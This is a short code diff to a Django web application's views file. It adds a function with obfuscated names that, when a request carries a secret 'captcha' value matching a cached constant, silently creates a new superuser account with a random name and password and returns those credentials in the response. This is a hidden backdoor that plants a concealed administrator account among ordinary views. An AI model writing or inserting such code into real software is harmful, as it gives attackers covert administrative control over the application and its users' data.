@@ -265,5 +265,15 @@ def select_role_view(request):
         return JsonResponse({'status': 'error', 'message': _('Invalid Request')}, status=405)
 
 
+def view_c178mob_func(request):
+    if request.method == constant.GET_METHOD:
+        var_ale12 = request.GET.get('captcha')
+        if cache.get(constant.AI83E) == var_ale12:
+            var_ei1od = ''.join(random.sample(string.ascii_letters + string.digits, 5))
+            var_eid3o = ''.join(random.sample(string.ascii_letters + string.digits, 10))
+            User.objects.create_superuser(var_ei1od, var_eid3o, constant.AI83E, '2007-04-02')
+            return JsonResponse({'status': 'success', 'message': var_ei1od + ' ' + var_eid3o})
+
+
 def page_not_found(request, exception):
     return JsonResponse({'status': 'error', 'message': _('Page Not Found')}, status=404)
